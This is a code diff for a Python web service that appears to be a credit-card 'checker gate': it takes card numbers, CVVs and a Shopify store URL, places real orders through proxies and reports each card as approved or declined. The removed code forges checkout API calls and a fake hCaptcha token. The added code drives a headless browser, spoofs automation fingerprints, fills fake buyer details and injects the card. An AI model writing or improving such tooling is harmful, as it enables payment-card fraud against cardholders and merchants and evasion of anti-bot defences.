@@ -1,18 +1,22 @@
+import sys
+import asyncio
+import threading
+
+if sys.platform == 'win32':
+    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
+
 from fastapi import FastAPI, Query
 from fastapi.responses import JSONResponse
-from curl_cffi import requests
-import re
-import uuid
+from playwright.sync_api import sync_playwright
 import random
-import string
+import re
+import requests
 import time
-import urllib3
-from html import unescape
-from urllib.parse import urlparse
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+import uvicorn
 
 app = FastAPI()
+
+browser_queue = threading.Semaphore(3)
 
 def format_proxy(proxy_str):
     if not proxy_str: return None
@@ -22,207 +26,319 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Shopify Payments"):
-    raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
-    final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Unrecognized" in msg) else msg
-    clean_price = str(price).replace('$', '').strip() if price else "-"
-    return {"Response": final_msg, "Price": clean_price, "Gate": gate}
-
-def generate_short_token():
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
-
-def generate_page_id():
-    return str(uuid.uuid4()).upper()
+def safe_response(msg, price="-", status="Declined", gate="Shopify Universal Master"):
+    if any(x in msg.lower() for x in ["approved", "success", "thank you", "ds_required", "order completed", "otp"]):
+        status = "Approved"
+    return {"Status": status, "Response": msg, "Price": price, "Gate": gate}
 
 @app.get("/code/index.php")
-def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
-    start_time = time.time()
+def shopify_hybrid_api(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
     try:
         cc_parts = re.findall(r'\d+', cc.replace('|', ' '))
-        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format", "", "-"))
+        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format"))
         cc_num, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
         if len(yy) == 2: yy = "20" + yy
 
         store_url = url.rstrip('/')
-        try: scope_host = urlparse(store_url).netloc or store_url.replace('https://', '').replace('http://', '').split('/')[0]
-        except: scope_host = store_url.replace('https://', '').replace('http://', '').split('/')[0]
-        
         proxy_url = format_proxy(proxy)
-        proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+        
+        fn = random.choice(["Alex", "John", "Mike", "Sarah", "David"])
+        ln = random.choice(["Smith", "Doe", "Johnson", "Brown", "Taylor"])
+        email = f"{fn.lower()}{ln.lower()}{random.randint(1000,9999)}@gmail.com"
+        phone = f"302448{random.randint(1000, 9999)}"
+        
+        print(f"\n=====================================")
+        print(f"🚀 [1] بدء فحص: {cc_num[:6]}... المتجر: {store_url}")
 
-        fn = random.choice(["Michael", "James", "David", "John", "Robert"])
-        ln = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
-        full_name = f"{fn} {ln}"
-        email = f"{fn.lower()}{ln.lower()}{random.randint(100, 999)}@gmail.com"
-        address1 = f"{random.randint(100, 9999)} Broadway"
-        phone = f"212{random.randint(2000000, 9999999)}"
-
-        buyer = {
-            "email": email, "first_name": fn, "last_name": ln, "full_name": full_name,
-            "address1": address1, "city": "New York", "province": "NY", "zip": "10024", "country": "US", "phone": phone
-        }
-
-        with requests.Session(impersonate="chrome120") as session:
-            session.verify = False
-
-            # 1. سحب المنتج
+        for attempt in range(1, 3):
             variant_id, price = None, "-"
-            r1 = session.get(f"{store_url}/products.json?limit=250", timeout=10, proxies=proxies)
-            if r1.status_code == 200:
-                data = r1.json()
-                prods = data.get('products', []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
-                for p in prods:
-                    for v in p.get('variants', []):
-                        if v.get('available'):
-                            pr = float(v.get('price', 0))
-                            if pr > 10000: pr /= 100.0
-                            if pr > 0:
-                                variant_id = str(v.get('id'))
-                                price = "{:.2f}".format(pr)
-                                break
-                    if variant_id: break
-
-            if not variant_id: return JSONResponse(content=safe_response("Product Not Found", "", "-"))
-
-            # 2. الإضافة للسلة وتوليد التوكن
-            session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1}, proxies=proxies)
-            res_chk = session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True, proxies=proxies)
-            html_chk = res_chk.text
-            final_url = str(res_chk.url)
-
-            session_token, checkout_token = None, None
-            ct_match = re.search(r'/checkouts/(?:c|cn|unstable|c/graphql)/([^/?]+)', final_url)
-            if ct_match: checkout_token = ct_match.group(1)
-
-            meta_st = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
-            js_st = re.search(r'["\']?sessionToken["\']?\s*:\s*["\']([^"\']{20,})["\']', html_chk, re.IGNORECASE)
-            jwt_match = re.search(r'(eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})', html_chk)
-
-            if meta_st: session_token = unescape(meta_st.group(1))
-            elif js_st: session_token = unescape(js_st.group(1))
-            elif jwt_match: session_token = jwt_match.group(1)
-
-            if not session_token or not checkout_token: 
-                return JSONResponse(content=safe_response("Session Token Missing", "Cloudflare Block or Custom Checkout", price))
-
-            # 3. تشفير الفيزا (PCI)
-            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
-            res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['full_name']}, "payment_session_scope": scope_host}, headers=pci_headers, proxies=proxies)
-            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
-            card_session_id = res_pci.json().get("id")
-
-            # 4. تجهيز الـ Proposal
-            gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
-            gql_headers = {
-                'shopify-checkout-client': 'checkout-web/1.0', 
-                'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
-                'x-checkout-web-source-id': checkout_token, 
-                'x-checkout-one-session-token': session_token, 
-                'Content-Type': 'application/json',
-                'Origin': store_url, 'Referer': final_url
-            }
             
-            flat_address = {
-                "address1": buyer["address1"], "address2": "", "city": buyer["city"], "countryCode": buyer["country"],
-                "postalCode": buyer["zip"], "firstName": buyer["first_name"], "lastName": buyer["last_name"],
-                "zoneCode": buyer["province"], "phone": buyer["phone"]
-            }
-            merch_id = str(uuid.uuid4())
-
-            prop_query = """query Proposal($delivery: DeliveryTermsInput, $payment: PaymentTermInput, $merchandise: MerchandiseTermInput, $buyerIdentity: BuyerIdentityTermInput, $sessionInput: SessionTokenInput!) { session(sessionInput: $sessionInput) { negotiate(input: {purchaseProposal: {delivery: $delivery, payment: $payment, merchandise: $merchandise, buyerIdentity: $buyerIdentity}}) { result { ... on NegotiationResultAvailable { queueToken sellerProposal { payment { ... on FilledPaymentTerms { availablePaymentLines { paymentMethod { ... on PaymentProvider { paymentMethodIdentifier name } } } } } delivery { ... on FilledDeliveryTerms { deliveryLines { selectedDeliveryStrategy { ... on CompleteDeliveryStrategy { handle amount { ... on MoneyValueConstraint { value { amount currencyCode } } } } } availableDeliveryStrategies { ... on CompleteDeliveryStrategy { handle amount { ... on MoneyValueConstraint { value { amount currencyCode } } } } } } } } } } } } } }"""
-            
-            prop_vars = {
-                "sessionInput": {"sessionToken": session_token},
-                "delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": flat_address}, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {"any": True}, "destinationChanged": False}], "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True},
-                "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": flat_address}},
-                "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": []}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}, "lineComponentsSource": None, "lineComponents": []}]},
-                "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [], "shopPayOptInPhone": {"number": buyer["phone"], "countryCode": "US"}, "rememberMe": False}
-            }
-            
-            res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers, proxies=proxies)
-            queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
-
-            gateway_id = "cad649605672ab70f23f8c528db5e8ae"
-            delivery_handle = "any"
-            del_amt_constraint = {"any": True}
             try:
-                seller_prop = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
-                avail_payments = seller_prop.get('payment', {}).get('availablePaymentLines', [])
-                for p in avail_payments:
-                    pm = p.get('paymentMethod', {})
-                    if pm.get('paymentMethodIdentifier'):
-                        gateway_id = pm.get('paymentMethodIdentifier')
-                        if pm.get('name') == 'shopify_payments': break
-                d_lines = seller_prop.get('delivery', {}).get('deliveryLines', [])
-                if d_lines and d_lines[0].get('selectedDeliveryStrategy'):
-                    delivery_handle = d_lines[0]['selectedDeliveryStrategy'].get('handle', 'any')
-                    d_amt = d_lines[0]['selectedDeliveryStrategy'].get('amount', {}).get('value')
-                    if d_amt: del_amt_constraint = {"value": {"amount": d_amt['amount'], "currencyCode": d_amt['currencyCode']}}
+                req_proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+                r = requests.get(f"{store_url}/products.json?limit=250", proxies=req_proxies, verify=False, timeout=15.0)
+                if r.status_code == 200:
+                    all_variants = []
+                    for p in r.json().get('products', []):
+                        for v in p.get('variants', []):
+                            if v.get('available'): 
+                                try:
+                                    v_price = float(v.get('price', 0))
+                                    if v_price > 0:
+                                        all_variants.append((v_price, str(v.get('id')), str(v.get('price'))))
+                                except: pass
+                    
+                    if all_variants:
+                        all_variants.sort(key=lambda x: x[0])
+                        variant_id = all_variants[0][1]
+                        price = all_variants[0][2]
             except: pass
 
-            # 5. 🔥 الضربة القاضية: إرسال الطلب بالـ ID المخفي (بدون الـ Query الطويل)
-            # لاحظ الرابط اتغير لـ /persisted
-            sub_url = f"{store_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
-            
-            sub_vars = {
-                "attemptToken": f"{checkout_token}-{generate_short_token()}", 
-                "input": {
-                    "sessionInput": {"sessionToken": session_token}, 
-                    "queueToken": queue_token, 
-                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
-                    "delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": flat_address}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": del_amt_constraint}], "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True},
-                    "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": []}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}, "lineComponentsSource": None, "lineComponents": []}]},
-                    "taxes": {"proposedTotalAmount": {"any": True}},
-                    "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": gateway_id, "sessionId": card_session_id, "billingAddress": {"streetAddress": flat_address}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": flat_address}},
-                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [{"email": {"consentState": "DECLINED", "value": buyer["email"]}}], "shopPayOptInPhone": {"number": buyer["phone"], "countryCode": "US"}, "rememberMe": False},
-                    "captcha": {
-                        "provider": "hcaptcha",
-                        "challenge": "comparison_challenge_type",
-                        "token": f"P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.{generate_short_token()}_{generate_page_id()}"
-                    }
-                }
-            }
-            
-            # ده البايلود الجديد الخفيف اللي المتصفح بيبعته
-            sub_payload = {
-                "id": "48ab22a1f2e1aed3aad818910358bd0463e01d34e78d5b204b852781eaaa4e8f",
-                "operationName": "SubmitForCompletion",
-                "variables": sub_vars
-            }
-            
-            res_sub = session.post(sub_url, json=sub_payload, headers=gql_headers, proxies=proxies)
-            sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
-            sub_typename = sub_data.get('__typename') if sub_data else None
-            
-            if sub_typename == 'SubmitRejected':
-                errs = sub_data.get('errors', [])
-                msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
-                return JSONResponse(content=safe_response(f"Shopify Rejected: {msg}", res_sub.text[:100], price))
-            
-            if sub_typename == 'SubmitFailed':
-                return JSONResponse(content=safe_response("Declined: Silent Gateway Rejection 💳", "SubmitFailed Detected", price))
+            if not variant_id: 
+                if attempt == 1:
+                    print("♻️ المحاولة 1 فشلت (جلب المنتج). جاري المحاولة مرة أخرى...")
+                    continue
+                print(f"❌ المتصفح لم يفتح: البروكسي ميت نهائياً أو لا توجد منتجات.")
+                return JSONResponse(content=safe_response("Product Not Found / Proxy Dead"))
 
-            receipt_id = sub_data.get('receipt', {}).get('id')
-            if not receipt_id: 
-                err = sub_data.get('receipt', {}).get('processingError', {}).get('code')
-                if err: return JSONResponse(content=safe_response(f"Declined: {err} 💳", res_sub.text[:100], price))
-                return JSONResponse(content=safe_response("Submit Failed (No Receipt)", res_sub.text[:100], price))
+            if attempt == 1:
+                print(f"✅ [2] تم إيجاد أرخص منتج بدقة: {variant_id} بسعر {price}")
 
-            # 6. فحص النتيجة النهائية من البنك
-            poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
-            poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
-            
-            for _ in range(6):
-                res_poll = session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": sessionToken}}, headers=gql_headers, proxies=proxies)
-                p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
-                if p_type == 'ProcessedReceipt': 
-                    return JSONResponse(content=safe_response("Order completed 💎", "Success", price))
-                elif p_type == 'FailedReceipt':
-                    err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
-                    return JSONResponse(content=safe_response(f"Declined: {err} 💳", err, price))
-                time.sleep(1.5)
-                
-            return JSONResponse(content=safe_response("Bank Timeout", "Bank taking too long", price))
+            with browser_queue:
+                with sync_playwright() as p:
+                    proxy_settings = None
+                    if proxy_url:
+                        from urllib.parse import urlparse
+                        p_parsed = urlparse(proxy_url)
+                        proxy_settings = {
+                            "server": f"http://{p_parsed.hostname}:{p_parsed.port}",
+                            "username": p_parsed.username,
+                            "password": p_parsed.password
+                        }
+
+                    # =======================================================
+                    # التعديل هنا: إضافة أوامر تمنع تعليق السيرفر في الوضع المخفي
+                    # =======================================================
+                    browser = p.chromium.launch(
+                        headless=True, 
+                        proxy=proxy_settings,
+                        args=[
+                            "--disable-blink-features=AutomationControlled", 
+                            "--disable-infobars",
+                            "--no-sandbox", 
+                            "--disable-setuid-sandbox", 
+                            "--disable-dev-shm-usage", 
+                            "--disable-gpu",
+                            "--window-size=1280,720" # إجبار المتصفح المخفي على حجم ثابت لمنع اختفاء الأزرار
+                        ]
+                    )
+                    
+                    context = browser.new_context(
+                        viewport={'width': 1280, 'height': 720},
+                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                        ignore_https_errors=True
+                    )
+                    
+                    # =======================================================
+                    # التخفي المتقدم لمنع حظر شوبيفاي للمتصفح المخفي
+                    # =======================================================
+                    context.add_init_script("""
+                        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3]});
+                        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+                    """)
+                    
+                    page = context.new_page()
+
+                    blocked_urls = ["google-analytics", "facebook.net", "tiktok.com", "hotjar", "pinterest"]
+                    def intercept_route(route):
+                        if route.request.resource_type in ["media", "image", "font"] or any(b in route.request.url for b in blocked_urls):
+                            route.abort()
+                        else:
+                            route.continue_()
+                    page.route("**/*", intercept_route)
+
+                    final_bank_response = "Waiting"
+                    payment_clicked = False
+
+                    def intercept_response(response):
+                        nonlocal final_bank_response, payment_clicked
+                        if not payment_clicked: return
+                        
+                        url_res = response.url.lower()
+                        if any(x in url_res for x in ['step_up', 'authenticate', 'cardinal', '3d_secure']):
+                            final_bank_response = "Approved 🟢 | DS_REQUIRED (OTP)"
+                            return
+
+                        if "graphql" in url_res or "processing" in url_res or ".json" in url_res:
+                            try:
+                                json_data = response.json()
+                                j_str = str(json_data).lower()
+                                
+                                if "ds_required" in j_str or "nextaction" in j_str or "3d_secure" in j_str or "redirect_url" in j_str:
+                                    final_bank_response = "Approved 🟢 | DS_REQUIRED (OTP)"
+                                    return
+                                    
+                                if isinstance(json_data, dict):
+                                    receipt = json_data.get('data', {}).get('receipt', {})
+                                    if receipt.get('__typename') == 'FailedReceipt':
+                                        code = receipt.get('processingError', {}).get('code', '')
+                                        msg = receipt.get('processingError', {}).get('messageUntranslated', '')
+                                        if code: final_bank_response = f"Declined: {code} - {msg}"
+                                        return
+                                    elif receipt.get('__typename') == 'ProcessedReceipt':
+                                        final_bank_response = "Approved 🟢 | Order Completed 💎"
+                                        return
+                                        
+                                    if json_data.get("status") in ["error", "failure"]:
+                                        err = json_data.get("error", {}).get("message", "Bank Rejected")
+                                        final_bank_response = f"Declined: {err}"
+                                        return
+                            except: pass
+                    
+                    page.on("response", intercept_response)
+
+                    try:
+                        if attempt == 1: print(f"🔗 [3] فتح صفحة الدفع (مخفي)...")
+                        page.goto(f"{store_url}/cart/{variant_id}:1", timeout=30000, wait_until="domcontentloaded")
+
+                        try:
+                            c_frame = page.frame_locator('iframe[src*="hcaptcha.com"]')
+                            if c_frame.locator('#checkbox').is_visible(timeout=500): 
+                                c_frame.locator('#checkbox').click()
+                        except: pass
+
+                        if attempt == 1: print(f"📍 [4] فرض الدولة والولاية (مخفي)...")
+                        try:
+                            page.evaluate("""
+                                let countrySel = document.querySelector('select[name="countryCode"], select[name="shippingAddress.country"]');
+                                if(countrySel) {
+                                    countrySel.value = 'US';
+                                    countrySel.dispatchEvent(new Event('change', {bubbles: true}));
+                                }
+                            """)
+                        except: pass
+                        
+                        time.sleep(1.5) 
+                        
+                        try:
+                            page.evaluate("""
+                                let stateSel = document.querySelector('select[name="zone"], select[name="shippingAddress.province"]');
+                                if(stateSel) {
+                                    stateSel.value = 'DE';
+                                    stateSel.dispatchEvent(new Event('change', {bubbles: true}));
+                                }
+                            """)
+                        except: pass
+                        
+                        time.sleep(0.5)
+
+                        if attempt == 1: print(f"✍️ [5] تعبئة الشحن وتخطي الصفحات...")
+                        try: page.locator('input[type="email"], input[name="email"], #checkout_email').first.fill(email)
+                        except: pass
+                        try: page.locator('input[name*="firstName"]').first.fill(fn)
+                        except: pass
+                        try: page.locator('input[name*="lastName"]').first.fill(ln)
+                        except: pass
+                        try: page.locator('input[name*="address1"]').first.fill("100 Market St")
+                        except: pass
+                        try: page.locator('input[name*="city"]').first.fill("Wilmington")
+                        except: pass
+                        try: 
+                            zip_loc = page.locator('input[name*="postalCode"], input[name*="zip"]').first
+                            zip_loc.fill("19801")
+                            page.keyboard.press("Escape") 
+                        except: pass
+                        try: page.locator('input[type="tel"]').first.fill(phone)
+                        except: pass
+
+                        for _ in range(8):
+                            if page.locator('iframe[name^="card-fields-number"]').is_visible():
+                                break
+                            
+                            try:
+                                page.evaluate("""
+                                    let btns = Array.from(document.querySelectorAll('button, input[type="submit"]'));
+                                    let continueBtn = btns.find(b => 
+                                        !b.disabled && 
+                                        b.offsetParent !== null && 
+                                        (b.textContent.toLowerCase().includes('continue') || 
+                                         b.textContent.toLowerCase().includes('next') || 
+                                         b.value.toLowerCase().includes('continue') || 
+                                         b.id === 'continue_button')
+                                    );
+                                    if(continueBtn) continueBtn.click();
+                                """)
+                                time.sleep(1.5) 
+                            except: pass
+
+                        if attempt == 1: print(f"💳 [6] حقن البطاقة والدفع...")
+                        page.wait_for_selector('iframe[name^="card-fields-number"]', timeout=20000)
+                        
+                        page.frame_locator('iframe[name^="card-fields-number"]').locator('input[name="number"]').first.fill(cc_num)
+                        page.frame_locator('iframe[name^="card-fields-expiry"]').locator('input[name="expiry"]').first.fill(f"{mm}{yy[-2:]}")
+                        page.frame_locator('iframe[name^="card-fields-verification_value"]').locator('input[name="verification_value"]').first.fill(cvv)
+
+                        payment_clicked = True
+                        
+                        try:
+                            price_els = page.locator('.payment-due__price, strong:has-text("$")')
+                            if price_els.count() > 0:
+                                raw_price = price_els.last.text_content()
+                                matched_price = re.search(r'\$?[\d,]+\.\d{2}', raw_price)
+                                if matched_price: 
+                                    price = matched_price.group(0).replace('$', '')
+                        except: pass
+
+                        for _ in range(50): 
+                            if final_bank_response != "Waiting": break
+
+                            try:
+                                page.evaluate("""
+                                    let btns = Array.from(document.querySelectorAll('button[type="submit"], button#continue_button, button#checkout-pay-button')).reverse();
+                                    let payBtn = btns.find(b => 
+                                        !b.disabled && 
+                                        b.offsetParent !== null && 
+                                        !b.textContent.toLowerCase().includes('apply') && 
+                                        !b.textContent.toLowerCase().includes('return') && 
+                                        (b.textContent.toLowerCase().includes('pay') || 
+                                         b.textContent.toLowerCase().includes('complete') || 
+                                         b.textContent.toLowerCase().includes('place order') || 
+                                         b.id === 'continue_button' || 
+                                         b.id === 'checkout-pay-button')
+                                    );
+                                    if(payBtn) payBtn.click();
+                                """)
+                            except: pass
+                            
+                            current_url = page.url.lower()
+                            if any(x in current_url for x in ["thank_you", "orders", "post_purchase"]):
+                                final_bank_response = "Approved 🟢 | Order Completed 💎"
+                                break
+                            if any(x in current_url for x in ["authenticate", "step_up", "3d_secure", "cardinal", "vbv"]):
+                                final_bank_response = "Approved 🟢 | DS_REQUIRED (OTP)"
+                                break
+
+                            try:
+                                err = page.locator('.field__message--error, .notice--error, .form__errors, [data-buyer-error]').first
+                                if err.is_visible(timeout=100):
+                                    err_txt = err.text_content()
+                                    if err_txt and "redirect" not in err_txt.lower():
+                                        clean_err = err_txt.strip().replace('\n', ' ')
+                                        final_bank_response = f"Declined: {clean_err[:70]}"
+                                        break
+                            except: pass
+                            
+                            time.sleep(0.3)
+                        
+                        if final_bank_response == "Waiting":
+                            final_bank_response = "Declined: Processing Timeout / Silent Drop"
+                        
+                        print(f"🎯 النتيجة: {final_bank_response}")
+                        return JSONResponse(content=safe_response(final_bank_response, price))
+                            
+                    except Exception as e:
+                        err_msg = str(e)[:150]
+                        print(f"❌ خطأ (محاولة {attempt}): {err_msg}")
+                        
+                        if "Target closed" in err_msg or "Timeout" in err_msg or "ERR_PROXY" in err_msg:
+                            if attempt == 1:
+                                print("♻️ جاري إعادة الفحص تلقائياً ببروكسي/جلسة جديدة...")
+                                time.sleep(1)
+                                continue 
+                            else:
+                                return JSONResponse(content=safe_response(f"Declined: Proxy slow or Blocked", price))
+                                
+                        return JSONResponse(content=safe_response(f"Error: {err_msg}", price))
+                        
+                    finally:
+                        try: browser.close()
+                        except: pass
+                        print(f"=====================================\n")
+
+        return JSONResponse(content=safe_response("Critical Error: Max Retries Reached"))
 
     except Exception as e:
-        return JSONResponse(content=safe_response("System Error", str(e), "-"))
+        return JSONResponse(content=safe_response(f"Critical Error: {str(e)}"))
+
+if __name__ == "__main__":
+    uvicorn.run("api:app", host="0.0.0.0", port=8000)
